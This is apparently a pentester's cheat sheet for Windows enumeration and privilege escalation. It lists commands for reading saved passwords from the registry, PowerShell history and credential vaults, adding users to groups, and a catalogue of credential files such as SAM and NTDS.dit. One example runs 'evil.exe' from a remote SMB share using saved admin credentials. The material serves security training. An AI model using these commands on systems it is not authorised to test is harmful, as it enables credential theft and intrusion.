# Commands
## User Information
```powershell
# User info
whoami /all
# User info
net user

# Show groups
net group
# # Show local groups
net localgroup <groupname>

# Add user to group
net group <groupname> /add <username>

# Create account
net user <username> <password> /add
# Create account (AD)
## This will force the command to execute on the domain controller instead of the local computer
net user <username> <password> /add /domain

# User info
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
# List Admin group members
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Permissions (accesschk)
```bat
accesschk.exe -uwcqv "Authenticated Users" * /accepteula 
accesschk.exe -uwcqv %USERNAME% * /accepteula 
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul

accesschk.exe -uwcqv Users *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *
```

## Version Information
```powershell
# Shows info about system (Look whether HotFixes are applied or not)
systeminfo
# Current OS version
[System.Environment]::OSVersion.Version 
## Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn 
## All pacthes
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}
## List only "Security Update" patches
Get-Hotfix -description "Security update"

# List Defender Exclusions (Requires local admin privileges)
Get-MpPreference | select Exclusion*
```

## Environment
```powershell
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```


## PowerShell History

```powershell 
# Find the PATH where is saved
ConsoleHost_history

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

## PowerShell Transcript files

```powershell
# Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```


## PowerShell Module Logging
```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

## Drives
```powershell
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root

# Weak folder permission per drive
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
```


# Directories
```powershell
# Powershell history log file
C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# See any suspicious apps
"C:\Program Files" or "C:\Program Files (x86)"

# Apps on old windows versions
C:\Data\Users\app

# Code policies and passwords in files
C:\Program Files\windowspowershell\modules\packagemanagement

# Config files
C:\Windows\System32\config

# AD database file location
C:\Windows\NTDS
```


# Network
## Shares
```powershell
# List computers
net view 
# Shares on the domains 
net view /all /domain [domainname]
# List shares of a computer 
net view \\computer /ALL
# Mount the share locally
net use x: \\computer\share 
# Check current shares
net share
```

## Ports
```bat
netstat -ano
```


# Windows Credentials
## Winlogon Credentials

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

# Misc
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

## Credentials manager / Windows vault

The Windows Vault stores user credentials for servers, websites and other programs that **Windows** can **log in the users automaticall**y. 

Windows Vault stores credentials that Windows can log in the users automatically, which means that any **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.

- List stored credentials
```
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```
- Then you can use `runas` with the `/savecred` options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.
```
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

## PowerShell Credentials

```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

joe

PS C:\htb> $credential.GetNetworkCredential().password

PASSWORD1234!
```

## Remote Desktop Credentials Manager
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

## Sticky Notes
People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realising it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

## SSH Keys In Registry
```powershell
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

## Files That May Contain Credentials
```powershell
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```


# Services
```powershell
net start 
wmic service list brief 
sc query 
Get-Service
```


# Drivers
Look for drivers that look "off" or out of date.
```bat
driverquery
driverquery.exe /fo table 
driverquery /SI
```

# accesschk - Enumeration
[accesschk](https://github.com/ankh2054/windows-pentest) is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more. This tool will be helpful to identify whether the current user can modify files within a certain service directory.
```bat
:: Accept eula
accesschk.exe /accepteula

:: Access to services
accesschk.exe <user> -kwsu HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services

:: Services access
accesschk.exe -uwcqv Users *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

:: Weak folder permission per drive
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
```
## Example usage in CTF situations

- [https://snowscan.io/htb-writeup-control/#](https://snowscan.io/htb-writeup-control/#)
- [https://steflan-security.com/windows-privilege-escalation-weak-permission/](https://steflan-security.com/windows-privilege-escalation-weak-permission/)


# Office Files
Modern `Office` documents are just zip archives with XML files so, just unzip it and look for data within the XML files.
```bash
unzip <file>
```

## References
- [https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)